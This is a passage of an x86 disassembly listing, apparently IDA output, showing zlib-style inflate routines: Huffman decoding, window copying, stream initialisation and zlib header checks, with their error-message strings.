					; DATA XREF: .text:00402393o
		mov	eax, [edi+24h]
		mov	ecx, edx
		sub	ecx, eax
		mov	eax, [ebx+0Ch]
		cmp	ecx, eax
		jnb	short loc_40217B
		mov	eax, [edi+28h]
		sub	eax, [edi+24h]
		sub	eax, [ebx+0Ch]
		add	eax, edx
		mov	[ebp+var_14], eax
		jmp	short loc_402182
; ---------------------------------------------------------------------------

loc_40217B:				; CODE XREF: sub_401E83+2E6j
		mov	ecx, edx
		sub	ecx, eax
		mov	[ebp+var_14], ecx

loc_402182:				; CODE XREF: sub_401E83+2F6j
		mov	eax, [ebp+var_C]

loc_402185:				; CODE XREF: sub_401E83+3B1j
		cmp	dword ptr [ebx+4], 0
		jz	loc_402239
		test	eax, eax
		jnz	short loc_402210
		mov	eax, [edi+28h]
		cmp	edx, eax
		jnz	short loc_4021B8
		mov	eax, [edi+2Ch]
		mov	ecx, [edi+24h]
		cmp	eax, ecx
		jz	short loc_4021B8
		mov	edx, ecx
		cmp	edx, eax
		jnb	short loc_4021AF
		sub	eax, edx
		dec	eax
		jmp	short loc_4021B4
; ---------------------------------------------------------------------------

loc_4021AF:				; CODE XREF: sub_401E83+325j
		mov	eax, [edi+28h]
		sub	eax, edx

loc_4021B4:				; CODE XREF: sub_401E83+32Aj
		test	eax, eax
		jnz	short loc_402210

loc_4021B8:				; CODE XREF: sub_401E83+315j
					; sub_401E83+31Fj
		push	[ebp+arg_8]
		mov	[edi+30h], edx
		push	esi
		push	edi
		call	sub_40315C
		mov	edx, [edi+30h]
		mov	[ebp+arg_8], eax
		mov	eax, [edi+2Ch]
		add	esp, 0Ch
		cmp	edx, eax
		jnb	short loc_4021DA
		sub	eax, edx
		dec	eax
		jmp	short loc_4021DF
; ---------------------------------------------------------------------------

loc_4021DA:				; CODE XREF: sub_401E83+350j
		mov	eax, [edi+28h]
		sub	eax, edx

loc_4021DF:				; CODE XREF: sub_401E83+355j
		mov	ecx, [edi+28h]
		mov	[ebp+var_C], eax
		cmp	edx, ecx
		jnz	short loc_402208
		mov	ecx, [edi+24h]
		mov	eax, [edi+2Ch]
		cmp	eax, ecx
		jz	short loc_402205
		mov	edx, ecx
		cmp	edx, eax
		jnb	short loc_4021FE
		sub	eax, edx
		dec	eax
		jmp	short loc_402208
; ---------------------------------------------------------------------------

loc_4021FE:				; CODE XREF: sub_401E83+374j
		mov	eax, [edi+28h]
		sub	eax, edx
		jmp	short loc_402208
; ---------------------------------------------------------------------------

loc_402205:				; CODE XREF: sub_401E83+36Ej
		mov	eax, [ebp+var_C]

loc_402208:				; CODE XREF: sub_401E83+364j
					; sub_401E83+379j ...
		test	eax, eax
		jz	loc_402332

loc_402210:				; CODE XREF: sub_401E83+30Ej
					; sub_401E83+333j
		mov	ecx, [ebp+var_14]
		and	[ebp+arg_8], 0
		mov	cl, [ecx]
		mov	[edx], cl
		inc	edx
		inc	[ebp+var_14]
		mov	ecx, [ebp+var_14]
		dec	eax
		mov	[ebp+var_C], eax
		cmp	ecx, [edi+28h]
		jnz	short loc_402231
		mov	ecx, [edi+24h]
		mov	[ebp+var_14], ecx

loc_402231:				; CODE XREF: sub_401E83+3A6j
		dec	dword ptr [ebx+4]
		jmp	loc_402185
; ---------------------------------------------------------------------------

loc_402239:				; CODE XREF: sub_401E83+306j
		and	dword ptr [ebx], 0
		jmp	loc_4022CF
; ---------------------------------------------------------------------------

loc_402241:				; CODE XREF: sub_401E83:loc_401EC8j
					; DATA XREF: .text:00402397o
		test	eax, eax
		jnz	short loc_4022BE
		mov	eax, [edi+28h]
		cmp	edx, eax
		jnz	short loc_40226A
		mov	eax, [edi+2Ch]
		mov	ecx, [edi+24h]
		cmp	eax, ecx
		jz	short loc_40226A
		mov	edx, ecx
		cmp	edx, eax
		jnb	short loc_402261
		sub	eax, edx
		dec	eax
		jmp	short loc_402266
; ---------------------------------------------------------------------------

loc_402261:				; CODE XREF: sub_401E83+3D7j
		mov	eax, [edi+28h]
		sub	eax, edx

loc_402266:				; CODE XREF: sub_401E83+3DCj
		test	eax, eax
		jnz	short loc_4022BE

loc_40226A:				; CODE XREF: sub_401E83+3C7j
					; sub_401E83+3D1j
		push	[ebp+arg_8]
		mov	[edi+30h], edx
		push	esi
		push	edi
		call	sub_40315C
		mov	edx, [edi+30h]
		mov	[ebp+arg_8], eax
		mov	eax, [edi+2Ch]
		add	esp, 0Ch
		cmp	edx, eax
		jnb	short loc_40228C
		sub	eax, edx
		dec	eax
		jmp	short loc_402291
; ---------------------------------------------------------------------------

loc_40228C:				; CODE XREF: sub_401E83+402j
		mov	eax, [edi+28h]
		sub	eax, edx

loc_402291:				; CODE XREF: sub_401E83+407j
		mov	ecx, [edi+28h]
		mov	[ebp+var_C], eax
		cmp	edx, ecx
		jnz	short loc_4022BA
		mov	ecx, [edi+24h]
		mov	eax, [edi+2Ch]
		cmp	eax, ecx
		jz	short loc_4022B7
		mov	edx, ecx
		cmp	edx, eax
		jnb	short loc_4022B0
		sub	eax, edx
		dec	eax
		jmp	short loc_4022BA
; ---------------------------------------------------------------------------

loc_4022B0:				; CODE XREF: sub_401E83+426j
		mov	eax, [edi+28h]
		sub	eax, edx
		jmp	short loc_4022BA
; ---------------------------------------------------------------------------

loc_4022B7:				; CODE XREF: sub_401E83+420j
		mov	eax, [ebp+var_C]

loc_4022BA:				; CODE XREF: sub_401E83+416j
					; sub_401E83+42Bj ...
		test	eax, eax
		jz	short loc_402332

loc_4022BE:				; CODE XREF: sub_401E83+3C0j
					; sub_401E83+3E5j
		and	[ebp+arg_8], 0
		mov	cl, [ebx+8]
		mov	[edx], cl
		inc	edx
		dec	eax
		and	dword ptr [ebx], 0

loc_4022CC:				; CODE XREF: sub_401E83+36j
					; sub_401E83+40j
		mov	[ebp+var_C], eax

loc_4022CF:				; CODE XREF: sub_401E83+E5j
					; sub_401E83+3B9j
		mov	ecx, [ebx]
		cmp	ecx, 9
		jbe	loc_401EC8
		push	0FFFFFFFEh

loc_4022DC:				; CODE XREF: sub_401E83+4ADj
					; sub_401E83+4B2j ...
		mov	eax, [ebp+arg_4]
		mov	[edi+20h], eax
		mov	eax, [ebp+arg_0]
		mov	[edi+1Ch], eax
		mov	eax, [ebp+var_8]
		mov	[esi+4], eax

loc_4022EE:				; CODE XREF: sub_401E83+49Cj
		mov	eax, [ebp+var_4]
		mov	ecx, eax
		sub	ecx, [esi]
		mov	[esi], eax
		add	[esi+8], ecx

loc_4022FA:				; CODE XREF: sub_401E83+4EBj
		push	esi
		push	edi
		mov	[edi+30h], edx
		call	sub_40315C
		add	esp, 0Ch
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ---------------------------------------------------------------------------

loc_40230C:				; CODE XREF: sub_401E83+103j
					; sub_401E83+1ADj ...
		mov	eax, [ebp+arg_4]
		push	[ebp+arg_8]
		mov	[edi+20h], eax
		mov	eax, [ebp+arg_0]
		mov	[edi+1Ch], eax
		and	dword ptr [esi+4], 0
		jmp	short loc_4022EE
; ---------------------------------------------------------------------------

loc_402321:				; CODE XREF: sub_401E83+198j
		mov	dword ptr [ebx], 9
		mov	dword ptr [esi+18h], offset aInvalidLiteral ; "invalid literal/length code"

loc_40232E:				; CODE XREF: sub_401E83:loc_401EC8j
					; sub_401E83+289j
					; DATA XREF: ...
		push	0FFFFFFFDh
		jmp	short loc_4022DC
; ---------------------------------------------------------------------------

loc_402332:				; CODE XREF: sub_401E83+387j
					; sub_401E83+439j
		push	[ebp+arg_8]
		jmp	short loc_4022DC
; ---------------------------------------------------------------------------

loc_402337:				; CODE XREF: sub_401E83:loc_401EC8j
					; DATA XREF: .text:0040239Bo
		push	[ebp+arg_8]
		mov	[edi+30h], edx
		push	esi
		push	edi
		call	sub_40315C
		mov	edx, [edi+30h]
		add	esp, 0Ch
		cmp	[edi+2Ch], edx
		jz	short loc_402370
		mov	ecx, [ebp+arg_4]
		mov	[edi+20h], ecx
		mov	ecx, [ebp+arg_0]
		mov	[edi+1Ch], ecx
		mov	ecx, [ebp+var_8]
		mov	[esi+4], ecx
		mov	ecx, [ebp+var_4]
		mov	ebx, ecx
		sub	ebx, [esi]
		mov	[esi], ecx
		add	[esi+8], ebx
		push	eax
		jmp	short loc_4022FA
; ---------------------------------------------------------------------------

loc_402370:				; CODE XREF: sub_401E83+4CAj
		mov	dword ptr [ebx], 8

loc_402376:				; CODE XREF: sub_401E83:loc_401EC8j
					; DATA XREF: .text:0040239Fo
		push	1
		jmp	loc_4022DC
sub_401E83	endp

; ---------------------------------------------------------------------------
		db 8Bh,	0FFh
off_40237F	dd offset loc_401ECF	; DATA XREF: sub_401E83:loc_401EC8r
		dd offset loc_401FA8
		dd offset loc_402052
		dd offset loc_4020AD
		dd offset loc_402137
		dd offset loc_40215D
		dd offset loc_402241
		dd offset loc_402337
		dd offset loc_402376
		dd offset loc_40232E

; =============== S U B	R O U T	I N E =======================================


sub_4023A7	proc near		; CODE XREF: sub_401596+3Bp
					; sub_401676+609p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_0]
		mov	eax, [esp+4+arg_4]
		push	dword ptr [eax+28h]
		call	dword ptr [eax+24h]
		pop	ecx
		pop	ecx
		retn
sub_4023A7	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4023B8	proc near		; CODE XREF: sub_401E83+94p

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_14]
		mov	eax, [esi]
		mov	[ebp+var_4], eax
		mov	eax, [esi+4]
		push	edi
		mov	edi, [ebp+arg_10]
		mov	ecx, [edi+30h]
		mov	ebx, [edi+20h]
		mov	edx, [edi+1Ch]
		mov	[ebp+var_8], eax
		mov	eax, [edi+2Ch]
		mov	[ebp+var_10], ecx
		cmp	ecx, eax
		jnb	short loc_4023EA
		sub	eax, ecx
		dec	eax
		jmp	short loc_4023EF
; ---------------------------------------------------------------------------

loc_4023EA:				; CODE XREF: sub_4023B8+2Bj
		mov	eax, [edi+28h]
		sub	eax, ecx

loc_4023EF:				; CODE XREF: sub_4023B8+30j
		mov	[ebp+var_C], eax
		mov	eax, [ebp+arg_0]
		mov	eax, dword_405308[eax*4]
		mov	[ebp+var_14], eax
		mov	eax, [ebp+arg_4]
		mov	eax, dword_405308[eax*4]
		mov	[ebp+var_18], eax
		jmp	short loc_402423
; ---------------------------------------------------------------------------

loc_40240E:				; CODE XREF: sub_4023B8+6Ej
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		dec	[ebp+var_8]
		mov	ecx, edx
		shl	eax, cl
		or	ebx, eax
		inc	[ebp+var_4]
		add	edx, 8

loc_402423:				; CODE XREF: sub_4023B8+54j
					; sub_4023B8+21Dj
		cmp	edx, 14h
		jb	short loc_40240E
		mov	eax, [ebp+var_14]
		mov	ecx, [ebp+arg_8]
		and	eax, ebx
		lea	eax, [ecx+eax*8]
		movzx	ecx, byte ptr [eax]
		mov	[ebp+arg_14], ecx
		test	ecx, ecx
		jmp	short loc_40245D
; ---------------------------------------------------------------------------

loc_40243D:				; CODE XREF: sub_4023B8+BDj
		test	cl, 40h
		jnz	loc_402647
		mov	ecx, dword_405308[ecx*4]
		mov	eax, [eax+4]
		and	ecx, ebx
		lea	eax, [eax+ecx*8]
		movzx	ecx, byte ptr [eax]
		mov	[ebp+arg_14], ecx
		test	ecx, ecx

loc_40245D:				; CODE XREF: sub_4023B8+83j
		movzx	ecx, byte ptr [eax+1]
		jz	loc_4025AE
		shr	ebx, cl
		movzx	ecx, byte ptr [eax+1]
		sub	edx, ecx
		mov	ecx, [ebp+arg_14]
		test	cl, 10h
		jz	short loc_40243D
		and	ecx, 0Fh
		mov	[ebp+arg_14], ecx
		mov	ecx, dword_405308[ecx*4]
		and	ecx, ebx
		add	ecx, [eax+4]
		mov	[ebp+arg_10], ecx
		mov	ecx, [ebp+arg_14]
		shr	ebx, cl
		sub	edx, ecx
		jmp	short loc_4024AA
; ---------------------------------------------------------------------------

loc_402495:				; CODE XREF: sub_4023B8+F5j
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		dec	[ebp+var_8]
		mov	ecx, edx
		shl	eax, cl
		or	ebx, eax
		inc	[ebp+var_4]
		add	edx, 8

loc_4024AA:				; CODE XREF: sub_4023B8+DBj
		cmp	edx, 0Fh
		jb	short loc_402495
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+arg_C]
		and	eax, ebx
		lea	eax, [ecx+eax*8]
		movzx	ecx, byte ptr [eax]
		mov	[ebp+arg_14], ecx
		movzx	ecx, byte ptr [eax+1]
		shr	ebx, cl
		movzx	ecx, byte ptr [eax+1]
		sub	edx, ecx
		jmp	short loc_4024FA
; ---------------------------------------------------------------------------

loc_4024CE:				; CODE XREF: sub_4023B8+149j
		mov	ecx, [ebp+arg_14]
		test	cl, 40h
		jnz	loc_40260A
		mov	ecx, dword_405308[ecx*4]
		mov	eax, [eax+4]
		and	ecx, ebx
		lea	eax, [eax+ecx*8]
		movzx	ecx, byte ptr [eax]
		mov	[ebp+arg_14], ecx
		movzx	ecx, byte ptr [eax+1]
		shr	ebx, cl
		mov	[ebp+arg_4], ecx
		sub	edx, ecx

loc_4024FA:				; CODE XREF: sub_4023B8+114j
		test	byte ptr [ebp+arg_14], 10h
		mov	[ebp+arg_0], eax
		jz	short loc_4024CE
		and	[ebp+arg_14], 0Fh
		cmp	edx, [ebp+arg_14]
		jnb	short loc_402529

loc_40250C:				; CODE XREF: sub_4023B8+16Cj
		mov	eax, [ebp+var_4]
		movzx	eax, byte ptr [eax]
		dec	[ebp+var_8]
		mov	ecx, edx
		shl	eax, cl
		add	edx, 8
		or	ebx, eax
		inc	[ebp+var_4]
		cmp	edx, [ebp+arg_14]
		jb	short loc_40250C
		mov	eax, [ebp+arg_0]

loc_402529:				; CODE XREF: sub_4023B8+152j
		mov	ecx, [ebp+arg_14]
		mov	ecx, dword_405308[ecx*4]
		and	ecx, ebx
		add	ecx, [eax+4]
		mov	eax, [ebp+arg_10]
		sub	[ebp+var_C], eax
		mov	eax, [ebp+var_10]
		mov	[ebp+arg_4], ecx
		mov	ecx, [ebp+arg_14]
		shr	ebx, cl
		sub	edx, ecx
		mov	ecx, [edi+24h]
		mov	[ebp+arg_0], ebx
		mov	ebx, eax
		sub	ebx, ecx
		cmp	ebx, [ebp+arg_4]
		jb	short loc_402571
		mov	ecx, eax
		sub	ecx, [ebp+arg_4]
		mov	bl, [ecx]
		mov	[eax], bl
		inc	eax
		inc	ecx
		mov	bl, [ecx]
		mov	[eax], bl
		inc	eax
		inc	ecx
		sub	[ebp+arg_10], 2
		jmp	short loc_40259E
; ---------------------------------------------------------------------------

loc_402571:				; CODE XREF: sub_4023B8+1A0j
		sub	ecx, eax
		add	ecx, [ebp+arg_4]
		mov	ebx, ecx
		mov	ecx, [edi+28h]
		sub	ecx, ebx
		mov	[ebp+arg_14], ecx
		cmp	[ebp+arg_10], ebx
		jbe	short loc_40259B
		sub	[ebp+arg_10], ebx

loc_402588:				; CODE XREF: sub_4023B8+1DCj
		mov	ecx, [ebp+arg_14]
		mov	cl, [ecx]
		mov	[eax], cl
		inc	eax
		inc	[ebp+arg_14]
		dec	ebx
		jnz	short loc_402588
		mov	ecx, [edi+24h]
		jmp	short loc_40259E
; ---------------------------------------------------------------------------

loc_40259B:				; CODE XREF: sub_4023B8+1CBj
		mov	ecx, [ebp+arg_14]

loc_40259E:				; CODE XREF: sub_4023B8+1B7j
					; sub_4023B8+1E1j ...
		mov	bl, [ecx]
		mov	[eax], bl
		inc	eax
		inc	ecx
		dec	[ebp+arg_10]
		jnz	short loc_40259E
		mov	ebx, [ebp+arg_0]
		jmp	short loc_4025C5
; ---------------------------------------------------------------------------

loc_4025AE:				; CODE XREF: sub_4023B8+A9j
		shr	ebx, cl
		movzx	ecx, byte ptr [eax+1]
		sub	edx, ecx
		mov	cl, [eax+4]
		mov	eax, [ebp+var_10]
		mov	[eax], cl
		inc	eax
		dec	[ebp+var_C]
		mov	[ebp+arg_0], ebx

loc_4025C5:				; CODE XREF: sub_4023B8+1F4j
		cmp	[ebp+var_C], 102h
		mov	[ebp+var_10], eax
		jb	short loc_4025DB
		cmp	[ebp+var_8], 0Ah
		jnb	loc_402423

loc_4025DB:				; CODE XREF: sub_4023B8+217j
		mov	ebx, [ebp+arg_0]
		mov	ecx, edx
		and	edx, 7
		mov	[edi+1Ch], edx
		mov	edx, [ebp+var_8]
		shr	ecx, 3
		sub	[ebp+var_4], ecx
		add	ecx, edx
		mov	[edi+20h], ebx
		mov	[esi+4], ecx
		mov	ecx, [ebp+var_4]
		mov	edx, ecx
		sub	edx, [esi]
		mov	[esi], ecx
		add	[esi+8], edx
		mov	[edi+30h], eax
		xor	eax, eax
		jmp	short loc_402689
; ---------------------------------------------------------------------------

loc_40260A:				; CODE XREF: sub_4023B8+11Cj
		mov	dword ptr [esi+18h], offset aInvalidDistanc ; "invalid distance	code"
		mov	[ebp+arg_14], 0FFFFFFFDh

loc_402618:				; CODE XREF: sub_4023B8+29Bj
		mov	ecx, [ebp+var_4]
		mov	eax, edx
		shr	eax, 3
		sub	ecx, eax
		and	edx, 7
		mov	[edi+1Ch], edx
		mov	edx, [ebp+var_8]
		add	eax, edx
		mov	[edi+20h], ebx
		mov	[esi+4], eax
		mov	eax, ecx
		sub	eax, [esi]
		mov	[esi], ecx
		add	[esi+8], eax
		mov	eax, [ebp+var_10]
		mov	[edi+30h], eax
		mov	eax, [ebp+arg_14]
		jmp	short loc_402689
; ---------------------------------------------------------------------------

loc_402647:				; CODE XREF: sub_4023B8+88j
		test	cl, 20h
		jz	short loc_402655
		mov	[ebp+arg_14], 1
		jmp	short loc_402618
; ---------------------------------------------------------------------------

loc_402655:				; CODE XREF: sub_4023B8+292j
		mov	ecx, [ebp+var_4]
		mov	eax, edx
		shr	eax, 3
		sub	ecx, eax
		and	edx, 7
		mov	dword ptr [esi+18h], offset aInvalidLiteral ; "invalid literal/length code"
		mov	[edi+1Ch], edx
		mov	edx, [ebp+var_8]
		add	eax, edx
		mov	[edi+20h], ebx
		mov	[esi+4], eax
		mov	eax, ecx
		sub	eax, [esi]
		mov	[esi], ecx
		add	[esi+8], eax
		mov	eax, [ebp+var_10]
		push	0FFFFFFFDh
		mov	[edi+30h], eax
		pop	eax

loc_402689:				; CODE XREF: sub_4023B8+250j
					; sub_4023B8+28Dj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4023B8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40268E	proc near		; CODE XREF: sub_402718+C4p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		cmp	eax, edx
		jz	short loc_4026CD
		mov	ecx, [eax+1Ch]
		cmp	ecx, edx
		jz	short loc_4026CD
		mov	[eax+14h], edx
		mov	[eax+8], edx
		mov	[eax+18h], edx
		mov	edx, [ecx+0Ch]
		neg	edx
		sbb	edx, edx
		and	edx, 7
		mov	[ecx], edx
		lea	ecx, [ebp+arg_0]
		push	ecx
		push	eax
		mov	eax, [eax+1Ch]
		push	dword ptr [eax+14h]
		call	sub_401596
		add	esp, 0Ch
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4026CD:				; CODE XREF: sub_40268E+Aj
					; sub_40268E+11j
		push	0FFFFFFFEh
		pop	eax
		pop	ebp
		retn
sub_40268E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4026D2	proc near		; CODE XREF: sub_401255+Dp
					; sub_402718+D2p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jz	short loc_402712
		mov	eax, [esi+1Ch]
		test	eax, eax
		jz	short loc_402712
		cmp	dword ptr [esi+24h], 0
		jz	short loc_402712
		mov	eax, [eax+14h]
		test	eax, eax
		jz	short loc_4026FF
		lea	ecx, [ebp+arg_0]
		push	ecx
		push	esi
		push	eax
		call	sub_401E22
		add	esp, 0Ch

loc_4026FF:				; CODE XREF: sub_4026D2+1Dj
		push	dword ptr [esi+1Ch]
		push	dword ptr [esi+28h]
		call	dword ptr [esi+24h]
		and	dword ptr [esi+1Ch], 0
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_402715
; ---------------------------------------------------------------------------

loc_402712:				; CODE XREF: sub_4026D2+9j
					; sub_4026D2+10j ...
		push	0FFFFFFFEh
		pop	eax

loc_402715:				; CODE XREF: sub_4026D2+3Ej
		pop	esi
		pop	ebp
		retn
sub_4026D2	endp


; =============== S U B	R O U T	I N E =======================================


sub_402718	proc near		; CODE XREF: sub_4027FB+Ep

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		mov	eax, [esp+arg_8]
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		cmp	eax, edi
		jz	loc_4027F4
		cmp	byte ptr [eax],	31h
		jnz	loc_4027F4
		cmp	[esp+0Ch+arg_C], 38h
		jnz	loc_4027F4
		mov	esi, [esp+0Ch+arg_0]
		cmp	esi, edi
		jnz	short loc_40274C
		push	0FFFFFFFEh
		jmp	loc_4027F6
; ---------------------------------------------------------------------------

loc_40274C:				; CODE XREF: sub_402718+2Bj
		mov	[esi+18h], edi
		cmp	[esi+20h], edi
		jnz	short loc_40275E
		mov	dword ptr [esi+20h], offset sub_403248
		mov	[esi+28h], edi

loc_40275E:				; CODE XREF: sub_402718+3Aj
		cmp	[esi+24h], edi
		jnz	short loc_40276A
		mov	dword ptr [esi+24h], offset sub_403258

loc_40276A:				; CODE XREF: sub_402718+49j
		xor	ebx, ebx
		push	18h
		inc	ebx
		push	ebx
		push	dword ptr [esi+28h]
		call	dword ptr [esi+20h]
		add	esp, 0Ch
		mov	[esi+1Ch], eax
		cmp	eax, edi
		jnz	short loc_402784
		push	0FFFFFFFCh
		jmp	short loc_4027F6
; ---------------------------------------------------------------------------

loc_402784:				; CODE XREF: sub_402718+66j
		mov	ecx, [esp+0Ch+arg_4]
		cmp	ecx, edi
		mov	[eax+14h], edi
		mov	eax, [esi+1Ch]
		mov	[eax+0Ch], edi
		jge	short loc_40279D
		mov	eax, [esi+1Ch]
		neg	ecx
		mov	[eax+0Ch], ebx

loc_40279D:				; CODE XREF: sub_402718+7Bj
		lea	eax, [ecx-8]
		cmp	eax, 7
		ja	short loc_4027E6
		mov	eax, [esi+1Ch]
		mov	[eax+10h], ecx
		mov	eax, [esi+1Ch]
		mov	eax, [eax+0Ch]
		shl	ebx, cl
		neg	eax
		sbb	eax, eax
		not	eax
		push	ebx
		and	eax, offset sub_401486
		push	eax
		push	esi
		call	sub_401615
		mov	ecx, [esi+1Ch]
		mov	[ecx+14h], eax
		mov	eax, [esi+1Ch]
		add	esp, 0Ch
		cmp	[eax+14h], edi
		jnz	short loc_4027DB
		push	0FFFFFFFCh
		jmp	short loc_4027E8
; ---------------------------------------------------------------------------

loc_4027DB:				; CODE XREF: sub_402718+BDj
		push	esi
		call	sub_40268E
		pop	ecx
		xor	eax, eax
		jmp	short loc_4027F7
; ---------------------------------------------------------------------------

loc_4027E6:				; CODE XREF: sub_402718+8Bj
		push	0FFFFFFFEh

loc_4027E8:				; CODE XREF: sub_402718+C1j
		pop	edi
		push	esi
		call	sub_4026D2
		pop	ecx
		mov	eax, edi
		jmp	short loc_4027F7
; ---------------------------------------------------------------------------

loc_4027F4:				; CODE XREF: sub_402718+Bj
					; sub_402718+14j ...
		push	0FFFFFFFAh

loc_4027F6:				; CODE XREF: sub_402718+2Fj
					; sub_402718+6Aj
		pop	eax

loc_4027F7:				; CODE XREF: sub_402718+CCj
					; sub_402718+DAj
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_402718	endp


; =============== S U B	R O U T	I N E =======================================


sub_4027FB	proc near		; CODE XREF: sub_40127C+Ep

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	[esp+arg_8]
		push	[esp+4+arg_4]
		push	0Fh
		push	[esp+0Ch+arg_0]
		call	sub_402718
		add	esp, 10h
		retn
sub_4027FB	endp


; =============== S U B	R O U T	I N E =======================================


sub_402812	proc near		; CODE XREF: sub_4012D1+49p

arg_0		= dword	ptr  4

		push	ebx
		push	ebp
		push	esi
		mov	esi, [esp+0Ch+arg_0]
		push	edi
		test	esi, esi
		jz	loc_402A39	; jumptable 00402849 default case
		mov	eax, [esi+1Ch]
		test	eax, eax
		jz	loc_402A39	; jumptable 00402849 default case
		cmp	dword ptr [esi], 0
		jz	loc_402A39	; jumptable 00402849 default case
		mov	eax, [eax]
		push	0FFFFFFFBh
		pop	edi
		push	0Dh
		pop	ebx
		cmp	eax, ebx	; switch 14 cases
		ja	loc_402A39	; jumptable 00402849 default case
		push	5
		pop	ebp

loc_402849:				; CODE XREF: sub_402812+221j
		jmp	ds:off_402B2A[eax*4] ; switch jump

loc_402850:				; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 0
		test	eax, eax
		jz	loc_402A41
		mov	ecx, [esi+1Ch]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		mov	eax, [esi]
		movzx	eax, byte ptr [eax]
		mov	[ecx+4], eax
		mov	eax, [esi+1Ch]
		mov	ecx, [eax+4]
		and	cl, 0Fh
		inc	dword ptr [esi]
		cmp	cl, 8
		jz	short loc_40288D
		mov	[eax], ebx
		mov	dword ptr [esi+18h], offset aUnknownCompres ; "unknown compression method"
		jmp	loc_402A26
; ---------------------------------------------------------------------------

loc_40288D:				; CODE XREF: sub_402812+6Bj
		mov	ecx, [eax+4]
		shr	ecx, 4
		add	ecx, 8
		cmp	ecx, [eax+10h]
		jbe	short loc_4028A9
		mov	[eax], ebx
		mov	dword ptr [esi+18h], offset aInvalidWindowS ; "invalid window size"
		jmp	loc_402A26
; ---------------------------------------------------------------------------

loc_4028A9:				; CODE XREF: sub_402812+87j
		mov	dword ptr [eax], 1

loc_4028AF:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 1
		test	eax, eax
		jz	loc_402A41
		mov	ecx, [esi+1Ch]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		mov	eax, [esi]
		movzx	ebx, byte ptr [eax]
		inc	eax
		mov	[esi], eax
		mov	eax, [ecx+4]
		shl	eax, 8
		push	1Fh
		add	eax, ebx
		xor	edx, edx
		pop	ebp
		div	ebp
		test	edx, edx
		jz	short loc_4028F5
		push	0Dh
		pop	ebx
		push	5
		mov	[ecx], ebx
		mov	dword ptr [esi+18h], offset aIncorrectHeade ; "incorrect header	check"
		pop	ebp
		jmp	loc_402A26
; ---------------------------------------------------------------------------

loc_4028F5:				; CODE XREF: sub_402812+CDj
		push	5
		pop	ebp
		test	bl, 20h
		jnz	loc_402A45
		push	0Dh
		mov	dword ptr [ecx], 7
		pop	ebx
		jmp	loc_402A2C
; ---------------------------------------------------------------------------

loc_40290F:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+1Ch]	; jumptable 00402849 case 7
		push	edi
		push	esi
		push	dword ptr [eax+14h]
		call	sub_401676
		mov	edi, eax
		add	esp, 0Ch
		cmp	edi, 0FFFFFFFDh
		jnz	short loc_402937
		mov	eax, [esi+1Ch]
		mov	[eax], ebx
		mov	eax, [esi+1Ch]
		and	dword ptr [eax+4], 0
		jmp	loc_402A2C
; ---------------------------------------------------------------------------

loc_402937:				; CODE XREF: sub_402812+112j
		cmp	edi, 1
		jnz	loc_402A41
		mov	eax, [esi+1Ch]
		lea	ecx, [eax+4]
		push	ecx
		push	esi
		push	dword ptr [eax+14h]
		xor	edi, edi
		call	sub_401596
		mov	eax, [esi+1Ch]
		add	esp, 0Ch
		cmp	[eax+0Ch], edi
		jz	short loc_402968
		mov	dword ptr [eax], 0Ch
		jmp	loc_402A2C
; ---------------------------------------------------------------------------

loc_402968:				; CODE XREF: sub_402812+149j
		mov	dword ptr [eax], 8

loc_40296E:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 8
		test	eax, eax
		jz	loc_402A41
		mov	ecx, [esi+1Ch]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		mov	eax, [esi]
		movzx	eax, byte ptr [eax]
		shl	eax, 18h
		mov	[ecx+8], eax
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	dword ptr [eax], 9

loc_40299B:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 9
		test	eax, eax
		jz	loc_402A41
		mov	ecx, [esi]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		shl	ecx, 10h
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	dword ptr [eax], 0Ah

